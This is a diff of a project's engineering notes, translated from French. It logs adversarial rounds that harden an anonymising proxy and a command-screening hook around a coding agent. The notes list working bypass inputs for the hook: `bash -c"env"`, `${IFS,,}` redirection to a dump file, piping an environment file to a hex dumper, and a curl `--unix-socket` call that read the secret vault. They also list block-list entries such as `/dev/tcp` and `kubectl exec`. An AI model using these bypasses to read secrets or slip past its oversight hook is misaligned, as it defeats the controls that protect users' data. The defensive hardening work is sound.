-arobase (`webmail:alice@hôte`) retombe dans la branche SSH et perd sa
-structure. La partie locale est écartée, donc aucune fuite — c'est une perte
-sémantique, du même ordre que celle corrigée pour `mailto:` au round 15.
+**Measured, accepted limit**: an UNRECOGNISED URI scheme carrying an at-sign
+(`webmail:alice@host`) falls into the SSH branch and loses its structure. The
+local part is discarded, so nothing leaks — it is a semantic loss, of the same
+order as the one fixed for `mailto:` in round 15.
 
-## Round 17 (2026-08-05) — le hook découpe par GRAMMAIRE, plus par approximation
-Arbitrage de jo : arrêter la boucle adversariale, attaquer le parseur. Fait.
-`tokenize` s'appuie sur `tree-sitter-bash` ; détail, pièges et mesures dans
-`docs/parseur-hook.md`. Ce que quatorze rounds d'heuristiques approximaient —
-`case`, définitions de fonction, groupes, heredocs, commentaires,
-concaténations — est désormais donné par construction.
+## Round 17 (2026-08-05) — the hook splits commands with a GRAMMAR, not approximations
 
-**L'ordre des passes est tout le sujet.** Le découpage travaille sur la
-commande BRUTE ; les contrôles par regex gardent le texte normalisé. Normaliser
-avant de parser faisait RENAÎTRE une structure que les guillemets avaient
-supprimée : `git commit -m 'handle case in parser(env)'` redevenait un
-sous-shell exécutant `env`. Les neuf faux positifs du premier branchement
-venaient tous de là — ils ressuscitaient d'un coup le défaut que les rounds 5,
-8 et 9 avaient éliminé.
+jo's arbitration: stop the adversarial loop, attack the parser. Done.
+`tokenize` is built on `tree-sitter-bash`; detail, traps and measurements in
+`docs/hook-parser.md`. What fourteen rounds of heuristics approximated —
+`case`, function definitions, groups, heredocs, comments, concatenations — is
+now given by construction.
 
-**Quatre pièges, chacun payé une fois** : l'expansion d'accolades doit précéder
-la grammaire (`{env,}` la fait tomber en ERREUR, et le mot reconstruit
-n'apparaît nulle part) mais seulement HORS guillemets, sinon un corps JSON
-casse l'appariement dont la grammaire dépend · la grammaire refuse des noms de
-fonction que bash accepte (`a@b`, `a%b`, `1fn`), et le CORPS disparaît avec le
-nom — seul le nom est remplacé · un argument CITÉ ne se lit plus par accident,
-il faut le RÉ-ANALYSER (`-c` d'un shell, `trap`, `mapfile -C`, `env -S`, corps
-de heredoc) · le terminateur d'une clause `-exec` arrive comme un mot ordinaire,
-et faisait passer `env` pour un préfixe exécutant `;`.
+**The pass ORDER is the whole subject.** Splitting works on the RAW command;
+the regex checks keep the normalised text. Normalising before parsing made a
+structure REAPPEAR that the quotes had suppressed: `git commit -m 'handle case
+in parser(env)'` became a subshell running `env`. The nine false positives of
+the first wiring all came from that — they resurrected in one go the defect
+rounds 5, 8 and 9 had eliminated.
 
-**Contournement introduit par mon propre correctif, trouvé en attaquant le code
-neuf** : `bash -c"env"` donne un nœud de CONCATÉNATION, réduit en `-cenv`, que
-ni la règle `-c` ni la ré-analyse ne voyaient. Le découper au tokeniseur serait
-faux — bash produit bien UN mot, et `/usr/"bin"/env` doit rester
-`/usr/bin/env` : c'est à la couche qui lit les options de séparer `-c` de sa
-valeur attachée. Même motif que la JUMELLE des rounds précédents : la forme
-séparée durcie, la forme collée laissée ouverte.
+**Four traps, each paid once**: brace expansion must precede the grammar
+(`{env,}` makes it ERROR, and the rebuilt word appears nowhere) but only
+OUTSIDE quotes, otherwise a JSON body breaks the quote pairing the grammar
+depends on · the grammar refuses function names bash accepts (`a@b`, `a%b`,
+`1fn`), and the BODY disappears with the name — only the name is replaced · a
+QUOTED argument no longer reads by accident, it must be RE-PARSED (`-c` of a
+shell, `trap`, `mapfile -C`, `env -S`, heredoc body) · a `-exec` clause
+terminator arrives as an ordinary word, and made `env` look like a prefix
+running `;`.
 
-Corollaire trouvé en corrigeant : `${IFS,,}` n'est pas une alternative mais un
-opérateur de casse — sans le `(?<!\$)` de `_ACCOLADES_RE`,
-`env${IFS,,}> /tmp/dump.txt` était réécrit en `env$IFS> env$> env$>`.
+**Bypass introduced by my own fix, found by attacking the new code**:
+`bash -c"env"` yields a CONCATENATION node, reduced to `-cenv`, which neither
+the `-c` rule nor the re-parsing saw. Splitting it in the tokenizer would be
+wrong — bash does produce ONE word, and `/usr/"bin"/env` must stay
+`/usr/bin/env`: it is for the option-reading layer to separate `-c` from its
+attached value. Same TWIN pattern as previous rounds.
 
-**La grammaire est un PRÉREQUIS de l'analyse** : sans elle, `tokenize` lève et
-le hook REFUSE. Claude Code lançant le hook sous le python système, qui ne l'a
-pas, `main` se relance sous `.venv/bin/python` (`os.execv` préserve stdin) —
-jamais à l'import, sinon une suite de tests sans grammaire verrait son propre
-processus remplacé.
+Corollary found while fixing: `${IFS,,}` is not an alternative but a case
+operator — without the `(?<!\$)` in `_ACCOLADES_RE`,
+`env${IFS,,}> /tmp/dump.txt` was rewritten as `env$IFS> env$> env$>`.
 
-Preuves : 1255 tests unitaires, `tests/phase4_e2e.sh` **PASS** en session
-réelle (refus avant exécution, tracé, raison exacte citée par le modèle),
-`tests/phase3_e2e.sh` **PASS** (0 valeur réelle sur 393,6 Ko, restauration
-3/3). Disponibilité : 0,003 s sur une commande réaliste, 0,42 s sur 500 Ko.
+**The grammar is a PREREQUISITE of the analysis**: without it, `tokenize`
+raises and the hook REFUSES. Since Claude Code runs the hook under the system
+python, which lacks it, `main` re-execs under the project interpreter
+(`os.execv` preserves stdin) — never at import, or a test suite without the
+grammar would replace its own process.
 
-## Round 18 (2026-08-06) — trois défauts trouvés EN SESSION, dont deux par le modèle
-La couche de politique et l'annonce sont livrées (`src/anonproxy/policy.py`,
-`annonce.py`, `scripts/anonproxy_policy.py`, `tests/policy_e2e.sh`). Bac à
-sable pour session réelle : `~/lab/ai/anonproxy-demo/` (coffre et clé propres).
+Proofs: 1255 unit tests, `tests/phase4_e2e.sh` **PASS** in a real session
+(refusal before execution, traced, exact reason quoted by the model),
+`tests/phase3_e2e.sh` **PASS** (0 real values across 393.6 KB, restoration
+3/3). Availability: 0.003 s on a realistic command, 0.42 s on 500 KB.
 
-**Ce que la session a trouvé et que seize rounds de revue n'avaient pas vu.**
-`10.1.2.0/24` n'est pas une adresse : `ip_address` échouait, la valeur tombait
-dans le générique et sortait sous un MOT (`glacier-vault10`). Le modèle voyait
-des hôtes dans un réseau fictif et une déclaration de sous-réseau qui n'en
-était pas une — il a signalé l'inventaire comme contradictoire · les plages de
-DOCUMENTATION sont `is_private` en Python bien qu'elles tiennent la place
-d'adresses routables, donc une passerelle publique recevait un substitut en
-`10.x`, et le générateur IPv6 rendait une ULA quoi qu'il arrive : l'attribut
-« interne vs externe » (§3.4) ne tenait ni pour ces plages ni en v6 · **le
-pire** : faire varier le troisième octet d'un /24 de documentation pour obtenir
-plusieurs réseaux SORT du réservé et tombe sur de l'espace alloué et routé —
-`198.51.32.0/24` appartient à quelqu'un. Un substitut ne doit jamais désigner
-la machine d'un tiers, sinon une commande proposée par le modèle part chez lui.
-Corrigé par RFC 2544 (`198.18.0.0/15`), réservé aux bancs d'essai.
+## Round 18 (2026-08-06) — three defects found IN SESSION, two of them by the model
 
-**Un test existant figeait la confusion** : il vérifiait `is_private` là où
-l'attribut préservé est « interne ». `est_privee` dit désormais ce qu'on veut
-vraiment dire.
+The policy layer and the announcement are delivered (`src/anonproxy/policy.py`,
+`annonce.py`, `scripts/anonproxy_policy.py`, `tests/policy_e2e.sh`). A sandbox
+for real sessions lives outside the repo, with its own vault and key.
 
-**L'invariant qui ferme la CLASSE** (`tests/test_invariant_substituts.py`) :
-*un substitut doit être indiscernable EN NATURE de ce qu'il remplace, et ne
-jamais désigner une entité du MONDE RÉEL.* Formulé une fois — le `kind` de la
-forme canonique du substitut doit égaler celui du réel — il couvre les trois et
-les suivants. Vérifié NON complaisant : les trois défauts rejoués le font
-tomber. Les trois n'étaient pas des oublis d'implémentation mais un invariant
-jamais énoncé.
+**What the session found and sixteen review rounds had not.** `10.1.2.0/24` is
+not an address: `ip_address` failed, the value fell into the generic branch and
+went out as a WORD (`glacier-vault10`). The model saw hosts inside a fictional
+network and a subnet declaration that was not one — it reported the inventory
+as self-contradictory · DOCUMENTATION ranges are `is_private` in Python
+although they stand in for routable addresses, so a public gateway received a
+`10.x` surrogate, and the IPv6 generator returned a ULA whatever the input: the
+"internal versus external" attribute (§3.4) held neither for those ranges nor
+in v6 · **the worst**: varying the third octet of a documentation /24 to obtain
+several networks LEAVES the reserved space and lands on allocated, routed
+address space — `198.51.32.0/24` belongs to someone. A surrogate must never
+name a third party's machine, or a command the model proposes goes to their
+network. Fixed with RFC 2544 (`198.18.0.0/15`), reserved for benchmarking.
 
-**Résidu MESURÉ, arbitrage à rendre** : un hôte externe fictif combine un mot
-de société fictive et un TLD RÉEL — `alpine-relecloud.net` peut appartenir à
-quelqu'un. Même famille que le défaut routable, surface plus large, et
-invérifiable sans requête DNS (donc sans violer D9). L'alternative RFC 2606
-(`.example`, `.invalid`, `.test`) est prouvablement à personne mais se lit
-comme fictive, ce qui abîme D1. **40/40 hôtes externes concernés**, compté par
-le test, pas affirmé.
+**An existing test pinned the confusion**: it checked `is_private` where the
+preserved attribute is "internal". `est_privee` now says what we actually mean.
 
-**Pas de skill pour ça (tranché le 2026-08-06)** : un skill agit sur le
-CONSOMMATEUR, ces défauts sont chez le PRODUCTEUR. Un skill ne pourrait
-qu'apprendre au modèle à composer avec l'artefact — ce qu'on a mesuré comme
-défaillant. Et faire dépendre la protection de la coopération du modèle est
-l'anti-patron §7. L'annonce, elle, est du prompt engineering embarqué assumé :
-elle INFORME, elle ne protège pas — et c'est elle qui a trouvé deux des trois.
+**The invariant that closes the CLASS**
+(`tests/test_invariant_substituts.py`): *a surrogate must be indistinguishable
+in NATURE from what it replaces, and must never designate a REAL-WORLD
+entity.* Stated once — the canonical `kind` of the surrogate must equal that of
+the real value — it covers all three and the next ones. Verified
+NON-complacent: replaying each of the three defects makes it fail. The three
+were not implementation oversights but an invariant never stated.
 
-## Round 19 (2026-08-06) — API d'arbitrage, et l'exemption qui débordait
-`src/anonproxy/policy_api.py` sert l'interface (extension VSCode/VSCodium dans
-`extension/`, JavaScript simple, sans étape de compilation). **Surface de
-contrôle, jamais point d'application** : désinstaller l'interface ne doit rien
-ouvrir — c'est le test de conception à repasser à chaque ajout, sinon on
-réintroduit l'anti-patron §7 en costume d'IDE.
+**MEASURED residual, arbitration pending**: a fictional external host combines
+a fictional-company word with a REAL TLD — `alpine-relecloud.net` may belong to
+someone. Same family as the routable defect, wider surface, and unverifiable
+without a DNS lookup (hence without breaking D9). The RFC 2606 alternative
+(`.example`, `.invalid`, `.test`) is provably nobody's but reads as fictional,
+which costs D1. **40/40 external hosts affected**, counted by the test, not
+asserted. Since round 19 this is the `domaines_fictifs` setting, so jo can
+choose per scope rather than once and for all.
 
-**Socket UNIX, jamais un port.** L'API affiche les valeurs RÉELLES — c'est sa
-raison d'être. Or l'agent tourne sur la même machine et le hook laisse passer
-le loopback : un port aurait rouvert la mitigation du gap §3.5, l'agent lisant
-le coffre par HTTP au lieu du fichier. Prix assumé : un navigateur ne parle pas
-aux sockets Unix, donc l'idée d'une page locale ouverte dans l'IDE tombe —
-l'interface doit être un vrai client (Node le fait nativement).
+**No skill for this (settled 2026-08-06)**: a skill acts on the CONSUMER, these
+defects are in the PRODUCER. A skill could only teach the model to cope with
+the artefact — which is what we measured as failing. And making protection
+depend on the model cooperating is the §7 anti-pattern. The announcement, on
+the other hand, is acknowledged embedded prompt engineering: it INFORMS, it
+does not protect — and it is what found two of the three.
 
-**CONTOURNEMENT que j'allais livrer, trouvé en me méfiant d'un test qui
-PASSAIT.** L'E2E refusait bien la socket, mais au titre de la « sortie
-réseau » : un refus obtenu par accident se contourne. Avec
-`curl --unix-socket … http://localhost/questions`, l'exemption « URL locale »
-— écrite pour que l'agent joigne le détecteur du projet — s'appliquait, et
-l'agent lisait le coffre. Trois formes passaient, dont
-`--abstract-unix-socket`. Avec un drapeau de socket, l'URL est DÉCORATIVE : la
-destination est la socket. C'est le motif de **l'EXEMPTION QUI DÉBORDE**, le
-même qu'au round 15.
+## Round 19 (2026-08-06) — control API, and the exemption that overflowed
 
-Leçon à garder : **un refus obtenu pour la mauvaise raison n'est pas un
-refus.** Vérifier POURQUOI un test passe, pas seulement qu'il passe.
+The control surface for the interface (VSCode/VSCodium extension in
+`extension/`, plain JavaScript, no build step). **Control surface, never an
+enforcement point**: uninstalling the interface must open nothing — the design
+test to repeat at every addition, or §7 comes back dressed as an IDE.
 
-## Défauts corrigés dans `anthropic_walker.py` (règle 6 — tests fournis AVANT)
-`tests/test_walker_defects.py` prouve les quatre, corrections minimales
-(le 4ᵉ vient de la revue adversariale) :
-0. **Fail-open sur les surfaces** — seules `system`/`messages`/`tools`/
-   `metadata` étaient traversées ; `stop_sequences`, `mcp_servers`,
-   `container`, `tool_choice` fuyaient, et la capture réelle montre déjà
-   `context_management`/`output_config`/`thinking` au premier niveau. Fix :
-   traverser TOUT sauf `REQUEST_CONTROL_KEYS`.
-1. **Plantage** `TypeError: unhashable type: 'dict'` — `node.get("type")` testé
-   sur un frozenset alors qu'une propriété de schéma peut s'appeler « type ».
-   Observé en session réelle → 500, Claude Code s'arrête. Fix : garde `isinstance(str)`.
-2. **Fuite** — la branche `properties` était morte (« properties » figurait
-   dans `SCHEMA_STRUCTURAL_KEYS`, testé avant) : la description d'une propriété
-   nommée `name`/`id`/`data` n'était PAS substituée (SKIP_KEYS s'appliquait aux
-   noms de propriétés). Fix : brancher `properties` d'abord.
-3. **Corruption** — `$schema`, `$ref`, `required` étaient substitués →
-   API 400 « JSON schema is invalid », et `required` ne correspondait plus aux
-   noms de propriétés. Fix : ces clés sont recopiées verbatim ; nouveau
-   `SCHEMA_NESTED_KEYS` pour `additionalProperties`/`items`.
+**Unix socket, never a port.** The API shows REAL values — that is its purpose.
+The agent runs on the same machine and the hook lets loopback through, so a
+port would have reopened the §3.5 mitigation, with the agent reading the vault
+over HTTP instead of the file. Accepted price: a browser cannot speak to a Unix
+socket, so the idea of a local page opened in the IDE dies with this choice —
+the interface must be a real client (Node does it natively).
 
-## Revue adversariale (2026-08-02, 3 agents opus effort max)
-Findings prouvés, corrigés, avec non-régression dans
-`tests/test_review_regressions.py` et `test_pretooluse_hook.py` :
+**BYPASS I was about to ship, found by distrusting a test that PASSED.** The
+E2E did refuse the socket, but on the grounds of "network egress": a refusal
+obtained by accident gets bypassed. With
+`curl --unix-socket … http://localhost/questions`, the "local URL" exemption —
+written so the agent could reach the project's detector — applied, and the
+agent read the vault. Three forms passed, including `--abstract-unix-socket`.
+With a socket flag the URL is DECORATIVE: the destination is the socket. This
+is the OVERFLOWING EXEMPTION pattern, the same as round 15.
 
-**Fuites du proxy** — passthrough transmettait le corps brut sur tout chemin
-non modélisé (`/v1/messages/batches`, `/v1/complete`) → 501 fail-closed ·
-`walk_request` n'énumérait que 4 surfaces alors que l'API en a d'autres
-(`stop_sequences`, `mcp_servers`, `container`, `tool_choice`) → traversée
-inversée (tout sauf `REQUEST_CONTROL_KEYS`) · `MIN_LEN=7` laissait passer
-`db01`, `jdoe`, tout identifiant court → supprimé · le mode `regex` sur gros
-volumes désactivait le NER → découpage avec recouvrement à la place ·
-chemin d'URL laissé en clair (`registry.X/payments/api` → hôte masqué,
-chemin nu) → segments et valeurs de query substitués.
+Lesson worth keeping: **a refusal obtained for the wrong reason is not a
+refusal.** Check WHY a test passes, not only that it passes.
 
-**Moteur** — un attribut partagé pouvait se substituer à LUI-MÊME (zone
-`lamna.internal`, préfixe `172.22.96.0` en clair) : garde `candidat == réel`
-manquante dans `_alloc_shared` · spans invalides (inversés, hors bornes)
-dupliquaient la valeur réelle → validation stricte, fail-closed · un même
-hôte vu comme HOSTNAME/FQDN/CERT_CN ou en casses différentes recevait
-jusqu'à 4 identités fictives → clé de coffre canonique · recouvrement
-partiel laissait la fin d'un domaine en clair → les fragments non couverts
-sont conservés · tag d'image préservé (SHA, branche, nom de client) →
-substitué sauf version publique · type interne `_SUBNET_V4` forgeable →
-refusé.
+## Round 20 (2026-08-06) — Go, and the reasons for it
 
-**Hook** — la détection était POSITIONNELLE : `/usr/bin/env`, `command env`,
-`bash -c env`, `printenv VAR`, `an[o]nproxy`, `cat .env|xxd` passaient tous.
-Remplacé par normalisation (quoting, globs, backslashes) + tokenisation.
-Ajout : `/dev/tcp`, réseau embarqué (python/node/perl), `k`/`oc`,
-`kubectl exec|cp`, `helm get values`, tfstate, jetons cloud, WebFetch sortant,
-outils non énumérés (MultiEdit, LS, Task, MCP), charges non-string.
+The control service is now Go (`go/cmd/anonproxy-control`), in English,
+endpoints included: `/health`, `/questions`, `/rules`, `/decide`, `/settings`,
+`/events`.
 
-**Tests complaisants** — le compteur de collisions était tautologique
-(itérait les clés d'un dict, uniques par construction) → lignes brutes +
-sonde active d'injectivité · la recherche de fuite ratait `\uXXXX` et `%XX`
-(donc tout accent) → normalisation avant recherche · dictionnaire de valeurs
-sensibles complété et dérivé de la fixture · assertions affaiblies par des
-`or` de repli supprimées.
+**Go rather than Rust**, and not only because Rust is not installed here. RE2
+is the decisive argument: rounds 8, 9 and 10 were spent on catastrophic regex
+backtracking — a free class at the head of a pattern cost seven to fifteen
+seconds and could freeze the agent without a single forbidden command. Go's
+regexp cannot backtrack, so that whole family stops being a defect to find and
+becomes impossible to write. A static binary also removes the hook's venv
+re-exec and its grammar bootstrap, and the streaming story is what was needed.
 
-## Suites de la revue (2026-08-02, second passage)
-- `walk_response` ne restaurait que `content` → tout le corps, plus les
-  événements SSE `message_delta` / `error` (écho de `stop_sequence`).
-- Cache du pipeline **clé par portée** (sinon un Pseudonymizer réutilisé entre
-  deux portées servait le substitut de la première).
-- Query params relayés sur `/v1/messages` et `count_tokens` (`?beta=true`).
-- Plausibilité (D1) : version et variante d'UUID recopiées, notation MAC Cisco
-  préservée, préfixe `sha256:` conservé, `PERSON` garde son nombre de mots,
-  littéral IPv6 dans une URL géré, espace d'hôte IPv6 porté à 64 bits.
-- Unicode NFC en canonicalisation (`café` composé ≡ décomposé) — les
-  homoglyphes cyrilliques restent DISTINCTS, sinon deux réels partageraient un
-  substitut.
-- Journal d'audit : les `allow` sont désormais tracés par empreinte SHA-256
-  tronquée (chronologie post-incident sans copier l'activité).
-- Preuve Phase 4 : marqueur unique par exécution (`ANONPROXY_DENY_MARKER`) au
-  lieu d'un grep sur des mots-clés que la prose du modèle pouvait satisfaire.
-- Corpus de propriété étendu à 10 300 valeurs : IPv6 denses, IP publiques,
-  hôtes hors `.internal`, noms très courts/longs, échappements JSON, Unicode,
-  préfixes stricts, UUID de versions variées, MAC des trois notations.
-- Garde-fou anti-complaisance dans `test_proxy_e2e.py` : le faux détecteur
-  ÉCHOUE bruyamment s'il ne couvre pas une valeur de la fixture, au lieu de
-  rendre le test vert pour la mauvaise raison.
+**What cannot move**: the detector is a Python ML library, so
+`services/anonshield/` stays Python. It already sits behind HTTP by D7, so that
+boundary costs nothing.
 
-**Résiduel documenté** : l'allocation dépend de l'ordre d'insertion pour les
-substituts qui entrent en collision de tirage — ramené de **40 % à ~4 %** en
-composant deux mots dès la première tentative. Sans effet en pratique (un
-projet n'a qu'un coffre, créé une fois) ; compte pour la reproductibilité
-d'une reconstruction de coffre. Borné par `test_ordre_d_insertion_effet_borne`.
+**The vault crypto is ported exactly, not approximated** — same
+domain-separated HMAC keys, same length-prefixed index and associated data,
+same padded AES-256-GCM — and `tests/control_e2e.sh` has Go decrypt a vault
+Python sealed, which is the only way to know the port is right.
 
-## Troisième revue adversariale (2026-08-02, après /simplify)
-Failles trouvées APRÈS deux passes de revue — toutes corrigées, toutes avec
-non-régression dans `tests/test_review_regressions.py` :
-- **CRITIQUE — mot de passe d'URL en clair.** `_fake_authority` découpait sur
-  le premier « : » : `https://alice:motdepasse@hôte.réel/` donnait `alice`
-  pour hôte et recopiait `:motdepasse@hôte.réel` en guise de port. Le mot de
-  passe ET le domaine réel partaient. RFC 3986 appliquée ; les identifiants
-  sont désormais traités comme des secrets (D4).
-- **CRITIQUE — jeton restaurable via le coffre.** Une URL de dépôt portant un
-  jeton (`https://oauth2:ghp_…@github.com/org/repo`) stockait le jeton dans la
-  colonne `real` : il redevenait restaurable, violation de D4. L'userinfo est
-  retiré avant la canonicalisation.
-- **CRITIQUE — hôte d'URL non enregistré.** `_fake_authority` appelait
-  `_fake_host` directement, hors coffre : le substitut restait libre et un
-  AUTRE hôte réel pouvait l'obtenir → la restauration désignait la mauvaise
-  machine (D6). Passe désormais par `substitute_value`.
-- **MAJEUR — fragment d'URL (`#…`) jamais substitué** : traité comme une paire
-  `nom=valeur`, donc ignoré. `#tenant-acme-nda` partait en clair.
-- **MAJEUR — IPv6 sans crochets** : tout ce qui suivait le premier « : » était
-  recopié tel quel.
-- **MAJEUR — une URL réduite à un hôte recevait sa propre identité**, donc
-  deux machines fictives pour un seul serveur réel.
-- **MODÉRÉ — un mot du lexique pouvait coïncider avec un mot du réel**
-  (`gateway-021` → `gateway-registry-021`, ~2 % des cas) : le tirage évite
-  maintenant les mots présents dans l'entrée.
-- **Tests complaisants** : le garde-fou du FakeDetector acceptait une
-  couverture PARTIELLE (`c in reel`) — un motif e-mail affaibli laissait fuir
-  `alice.dupont` sans qu'aucun test ne bronche ; l'assertion de recouvrement
-  ne cherchait qu'une seule sous-chaîne ; le test d'identité unique oubliait
-  le type URL. Les trois sont durcis, plus des assertions de fuite PARTIELLE.
+**`/events` is Server-Sent Events.** One-way is the actual need — events out,
+decisions in by POST — and SSE needs no dependency on either side, carries
+reconnection in the protocol, and is the mechanism this project already parses.
+A WebSocket would have added a second concept for no gain. Polling is gone from
+the extension, which matters in the case that motivated the blocking mode:
+learning three seconds late that a request is stuck on you is three seconds of
+an agent doing nothing.
 
-**Régression introduite puis corrigée pendant ces correctifs** : unifier
-l'hôte nu a fait entrer en conflit deux entrées de coffre pour un même
-substitut (`https://x` vs `https://x/`, spans avec points de troncature) —
-503 en pleine session, attrapé par `phase3_e2e.sh`, pas par les tests
-unitaires. C'est l'argument pour garder les preuves E2E réelles.
+**The binary has no default state paths** and refuses to start without them: a
+second source of truth would drift from the launcher's, and silently reading
+the wrong store is worse than not starting.
 
-## Déviations assumées à valider par jo
-- **Allowlist cloud resserrée vs §6 du plan** : `*.amazonaws.com` littéral
-  laissait fuir `db-prod.cluster-abc123.eu-west-3.rds.amazonaws.com` (endpoint
-  de RESSOURCE, porte l'identifiant du compte). Seule la forme
-  `<service>[.<région>].<cloud>` est allowlistée. Mesuré par `corpus_eval.py`.
-- **`SERVICE` (modèle cyber) classé PUBLIC** : se déclenche massivement sur de
-  la prose technique. À réévaluer sur le corpus réel.
-- **Attributs partagés exclus de la vue de restauration** : sinon un substitut
-  halluciné (`canyon-02-prod.<zone connue>`) était partiellement résolu en
-  `canyon-02-prod.<zone RÉELLE>` — hôte fictif déguisé en hôte réel (D5).
+**Remaining migration, in order**: the hook (biggest gain — startup, RE2, no
+venv — and its 708 tests already drive it as a SUBPROCESS, so a Go binary is
+validated by the existing suite unchanged), then vault and engine, then proxy
+and walker. Twelve Python patterns use lookaround, which RE2 does not support:
+each needs restructuring as "match then verify in code", and each restructuring
+is a chance to break a control hardened over nineteen rounds.
 
-## Découvertes Phase 0 (2026-08-01) — mises à jour le 2026-08-02
-- **Datadog** : le 2026-08-01, ~343 Ko partaient vers
-  `http-intake.logs.us5.datadoghq.com` (feature-flag statsig
-  `tengu_log_datadog_events`, flush ~15 s). Le 2026-08-02, `tests/datadog_probe.sh`
-  ne capte plus rien — mais **ce n'est pas une preuve** : jo a depuis posé
-  `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1`, `DISABLE_TELEMETRY=1`,
-  `DISABLE_ERROR_REPORTING=1` et `DO_NOT_TRACK` dans `~/.claude/settings.json`.
-  Ces variables sont injectées par Claude Code indépendamment de
-  l'environnement du script : la sonde tournait donc télémétrie DÉJÀ coupée.
-  Conclusion tenable : la coupure fonctionne. Le CONTENU des payloads reste
-  non inspecté. Pour le mesurer un jour, il faut neutraliser ces variables au
-  niveau des settings (`--settings` sur un fichier temporaire), pas de l'env.
-  Datadog reste volontairement ABSENTE de `known_destinations.json` : sa
-  réapparition doit faire ÉCHOUER le garde-fou.
-- **Quatre destinations sur cinq échappent au proxy** (mesuré) :
+## Round 21 (2026-08-06) — three parallel agents, two dead, one defect found
+
+jo asked for parallel work with subagents. Three were launched on disjoint
+paths: the Go hook port, the CLAUDE.md rounds, and REPRISE plus docs.
+
+**Two died mid-stream** — the same failure mode as round 13, despite the
+numbered-batch instruction that round 13 prescribed. The instruction is not
+enough: the unit of work has to be smaller. The rounds agent completed nine
+sections before dying and its work was saved; the Go agent left a skeleton that
+did not compile, referencing a package it never wrote.
+
+**A half-swapped security control is not shipped.** The Go skeleton was removed
+rather than left in the build — the same call as round 17, when the parser
+wiring was reverted at fifteen failing tests. It is kept outside the repo as a
+reference.
+
+**The launch itself found a defect.** Starting the agents was REFUSED twice, on
+prose: the `description` field of a tool call carrying the word for a
+chronological command record matched a text pattern. "git history", "release
+history", "incident history" were all refused — most of an engineering
+vocabulary. Rounds 8 and 9 had already settled the principle for everything
+else: the gate applies to the PROGRAM POSITION, not to the word appearing in
+the text. That rule had simply never been migrated to it. Recognising it by
+position also covers the wrappers by construction rather than by accident.
+
+## Defects fixed in `anthropic_walker.py` (rule 6 — tests supplied FIRST)
+
+`tests/test_walker_defects.py` proves all four, with minimal fixes (the fourth
+came out of the adversarial review):
+0. **Fail-open on surfaces** — only `system`/`messages`/`tools`/`metadata` were
+   traversed; `stop_sequences`, `mcp_servers`, `container`, `tool_choice`
+   leaked, and the real capture already shows
+   `context_management`/`output_config`/`thinking` at the top level. Fix:
+   traverse EVERYTHING except `REQUEST_CONTROL_KEYS`.
+1. **Crash** `TypeError: unhashable type: 'dict'` — `node.get("type")` tested
+   against a frozenset while a schema property can be called "type". Seen in a
+   real session → 500, Claude Code stops. Fix: an `isinstance(str)` guard.
+2. **Leak** — the `properties` branch was dead ("properties" appeared in
+   `SCHEMA_STRUCTURAL_KEYS`, tested first): the description of a property named
+   `name`/`id`/`data` was NOT substituted (SKIP_KEYS applied to property
+   names). Fix: handle `properties` first.
+3. **Corruption** — `$schema`, `$ref`, `required` were substituted → API 400
+   "JSON schema is invalid", and `required` no longer matched the property
+   names. Fix: those keys are copied verbatim; new `SCHEMA_NESTED_KEYS` for
+   `additionalProperties`/`items`.
+
+## First adversarial review (2026-08-02, 3 opus agents at max effort)
+
+Findings proven and fixed, with regression tests in
+`tests/test_review_regressions.py` and `test_pretooluse_hook.py`:
+
+**Proxy leaks** — passthrough forwarded the raw body on any unmodelled path
+(`/v1/messages/batches`, `/v1/complete`) → 501 fail-closed · `walk_request`
+enumerated only 4 surfaces while the API has others (`stop_sequences`,
+`mcp_servers`, `container`, `tool_choice`) → traversal inverted (everything
+except `REQUEST_CONTROL_KEYS`) · `MIN_LEN=7` let `db01`, `jdoe` and every short
+identifier through → removed · `regex` mode on large volumes disabled the NER →
+overlapping chunking instead · URL path left in clear
+(`registry.X/payments/api` → host masked, path bare) → segments and query
+values substituted.
+
+**Engine** — a shared attribute could substitute to ITSELF (zone
+`lamna.internal`, prefix `172.22.96.0` in clear): the `candidate == real` guard
+was missing in `_alloc_shared` · invalid spans (inverted, out of bounds)
+duplicated the real value → strict validation, fail-closed · one host seen as
+HOSTNAME/FQDN/CERT_CN or in different cases received up to 4 fictional
+identities → canonical vault key · partial overlap left the end of a domain in
+clear → uncovered fragments are preserved · image tag preserved (SHA, branch,
+customer name) → substituted unless a public version · internal type
+`_SUBNET_V4` forgeable → refused.
+
+**Hook** — detection was POSITIONAL: `/usr/bin/env`, `command env`,
+`bash -c env`, `printenv VAR`, `an[o]nproxy` and reading an environment file
+piped to a hex dumper all passed. Replaced by normalisation (quoting, globs,
+backslashes) plus tokenisation. Added: `/dev/tcp`, embedded network
+(python/node/perl), `k`/`oc`, `kubectl exec|cp`, `helm get values`, tfstate,
+cloud tokens, outbound WebFetch, unenumerated tools (MultiEdit, LS, Task, MCP),
+non-string payloads.
+
+**Complacent tests** — the collision counter was tautological (it iterated the
+keys of a dict, unique by construction) → raw lines plus an active injectivity
+probe · the leak search missed `\uXXXX` and `%XX` (hence every accent) →
+normalisation before searching · the sensitive-value dictionary completed and
+derived from the fixture · assertions weakened by fallback `or`s removed.
+
+## Follow-up to the review (2026-08-02, second pass)
+
+- `walk_response` only restored `content` → the whole body now, plus the SSE
+  `message_delta` / `error` events (echo of `stop_sequence`).
+- Pipeline cache **keyed by scope** (otherwise a Pseudonymizer reused across
+  two scopes served the first one's surrogate).
+- Query params relayed on `/v1/messages` and `count_tokens` (`?beta=true`).
+- Plausibility (D1): UUID version and variant preserved, Cisco MAC notation
+  preserved, `sha256:` prefix kept, `PERSON` keeps its word count, IPv6 literal
+  in a URL handled, IPv6 host space raised to 64 bits.
+- Unicode NFC in canonicalisation (`café` composed ≡ decomposed) — Cyrillic
+  homoglyphs stay DISTINCT, otherwise two real values would share a surrogate.
+- Audit log: `allow` entries are now traced by truncated SHA-256 fingerprint
+  (post-incident chronology without copying the activity).
+- Phase 4 proof: unique marker per run (`ANONPROXY_DENY_MARKER`) instead of a
+  grep on keywords the model's prose could satisfy.
+- Property corpus extended to 10,300 values: dense IPv6, public IPs, hosts
+  outside `.internal`, very short and very long names, JSON escapes, Unicode,
+  strict prefixes, UUIDs of various versions, MACs in all three notations.
+- Anti-complacency guard in `test_proxy_e2e.py`: the fake detector FAILS loudly
+  if it does not cover a fixture value, instead of turning the test green for
+  the wrong reason.
+
+**Documented residual**: allocation depends on insertion order for surrogates
+that collide on draw — brought down from **40 % to ~4 %** by composing two
+words on the first attempt. No practical effect (a project has one vault,
+created once); it matters for the reproducibility of a vault rebuild. Bounded
+by `test_ordre_d_insertion_effet_borne`.
+
